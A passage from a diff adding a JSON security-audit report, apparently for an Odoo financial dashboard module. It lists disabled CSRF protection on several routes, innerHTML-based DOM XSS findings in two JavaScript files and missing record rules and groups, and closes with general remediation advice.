+        "severity": "MEDIUM",
+        "description": "CSRF protection disabled",
+        "code_snippet": "    \n    @http.route('/financial/widget/export', type='json', auth='user', methods=['POST'])\n    def export_widget(self, widget_id, format='xlsx', filters=None):"
+      },
+      {
+        "file": "controllers/dashboard_export_controller.py",
+        "line": 192,
+        "type": "csrf",
+        "severity": "MEDIUM",
+        "description": "CSRF protection disabled",
+        "code_snippet": "    \n    @http.route('/financial/template/apply', type='json', auth='user', methods=['POST'])\n    def apply_template(self, template_id, user_id=None):"
+      },
+      {
+        "file": "controllers/dashboard_export_controller.py",
+        "line": 225,
+        "type": "csrf",
+        "severity": "MEDIUM",
+        "description": "CSRF protection disabled",
+        "code_snippet": "    \n    @http.route('/financial/template/create_from_layout', type='json', auth='user', methods=['POST'])\n    def create_template_from_layout(self, layout_id, name, description='', category_id=None, "
+      },
+      {
+        "file": "controllers/dashboard_export_controller.py",
+        "line": 270,
+        "type": "csrf",
+        "severity": "MEDIUM",
+        "description": "CSRF protection disabled",
+        "code_snippet": "    \n    @http.route('/financial/template/rate', type='json', auth='user', methods=['POST'])\n    def rate_template(self, template_id, rating, comment=''):"
+      },
+      {
+        "file": "controllers/dashboard_export_controller.py",
+        "line": 347,
+        "type": "csrf",
+        "severity": "MEDIUM",
+        "description": "CSRF protection disabled",
+        "code_snippet": "    \n    @http.route('/financial/widget/data/lazy', type='json', auth='user', methods=['POST'])\n    def get_widget_data_lazy(self, widget_id, filters=None):"
+      }
+    ],
+    "dom_xss": [
+      {
+        "file": "static/src/js/executive_dashboard.js",
+        "line": 335,
+        "type": "dom_xss",
+        "severity": "MEDIUM",
+        "description": "Client-side vulnerability: dom_xss",
+        "code_snippet": "        \n        container.innerHTML = html;\n    }"
+      },
+      {
+        "file": "static/src/js/executive_dashboard.js",
+        "line": 364,
+        "type": "dom_xss",
+        "severity": "MEDIUM",
+        "description": "Client-side vulnerability: dom_xss",
+        "code_snippet": "        \n        container.innerHTML = html;\n    }"
+      },
+      {
+        "file": "static/src/js/executive_dashboard.js",
+        "line": 385,
+        "type": "dom_xss",
+        "severity": "MEDIUM",
+        "description": "Client-side vulnerability: dom_xss",
+        "code_snippet": "        \n        container.innerHTML = html;\n    }"
+      },
+      {
+        "file": "static/src/js/bi_dashboard.js",
+        "line": 363,
+        "type": "dom_xss",
+        "severity": "MEDIUM",
+        "description": "Client-side vulnerability: dom_xss",
+        "code_snippet": "        \n        container.innerHTML = '';\n        "
+      },
+      {
+        "file": "static/src/js/bi_dashboard.js",
+        "line": 366,
+        "type": "dom_xss",
+        "severity": "MEDIUM",
+        "description": "Client-side vulnerability: dom_xss",
+        "code_snippet": "        if (alerts.length === 0) {\n            container.innerHTML = '<p class=\"text-muted\">No alerts at this time</p>';\n            return;"
+      },
+      {
+        "file": "static/src/js/bi_dashboard.js",
+        "line": 373,
+        "type": "dom_xss",
+        "severity": "MEDIUM",
+        "description": "Client-side vulnerability: dom_xss",
+        "code_snippet": "            alertDiv.className = `alert alert-${this.getAlertClass(alert.severity)} alert-dismissible fade show`;\n            alertDiv.innerHTML = `\n                <strong>${alert.type}:</strong> ${a"
+      },
+      {
+        "file": "static/src/js/bi_dashboard.js",
+        "line": 406,
+        "type": "dom_xss",
+        "severity": "MEDIUM",
+        "description": "Client-side vulnerability: dom_xss",
+        "code_snippet": "        \n        tbody.innerHTML = '';\n        const totalRevenue = customers.reduce((sum, c) => sum + c.total_revenue, 0);"
+      },
+      {
+        "file": "static/src/js/bi_dashboard.js",
+        "line": 412,
+        "type": "dom_xss",
+        "severity": "MEDIUM",
+        "description": "Client-side vulnerability: dom_xss",
+        "code_snippet": "            const row = document.createElement('tr');\n            row.innerHTML = `\n                <td>${customer.customer_name}</td>"
+      },
+      {
+        "file": "static/src/js/bi_dashboard.js",
+        "line": 469,
+        "type": "dom_xss",
+        "severity": "MEDIUM",
+        "description": "Client-side vulnerability: dom_xss",
+        "code_snippet": "        html += '</div>';\n        container.innerHTML = html;\n    }"
+      }
+    ],
+    "missing_record_rules": [
+      {
+        "file": "security/",
+        "line": 0,
+        "type": "missing_record_rules",
+        "severity": "MEDIUM",
+        "description": "No record rules defined for data isolation",
+        "code_snippet": "No ir.rule records found"
+      }
+    ],
+    "missing_groups": [
+      {
+        "file": "security/",
+        "line": 0,
+        "type": "missing_groups",
+        "severity": "LOW",
+        "description": "No security groups defined",
+        "code_snippet": "No res.groups records found"
+      }
+    ]
+  },
+  "compliance_issues": [],
+  "recommendations": [
+    "Use parameterized queries instead of string formatting in SQL",
+    "Sanitize all user input and use safe rendering methods",
+    "Implement proper access control with record rules and groups",
+    "Use strong cryptographic algorithms (SHA256+, AES256)",
+    "URGENT: Address critical and high severity issues immediately",
+    "Implement security testing in CI/CD pipeline",
+    "Conduct regular security audits and penetration testing"
+  ]
+}
